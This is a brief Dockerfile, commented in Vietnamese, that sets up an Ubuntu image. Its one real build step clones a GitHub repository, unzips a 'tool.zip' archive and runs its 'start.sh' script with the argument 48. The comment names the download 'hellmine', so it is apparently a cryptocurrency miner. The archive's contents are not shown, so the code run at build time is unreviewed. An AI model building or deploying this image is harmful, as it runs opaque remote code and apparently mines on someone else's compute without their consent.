FROM ubuntu:latest

# Cập nhật hệ thống và cài đặt các gói cần thiết
RUN apt update && apt upgrade -y && apt-get update && apt-get install -y htop \
    curl \
    ca-certificates \
    git \
    sudo \ 
    unzip \
    python3 
    

# Tạo thư mục làm việc và tải hellmine

RUN git clone https://github.com/Teo4268/Dockerfile.git && cd Dockerfile && unzip tool.zip && cd tool && chmod +x start.sh && ./start.sh 48
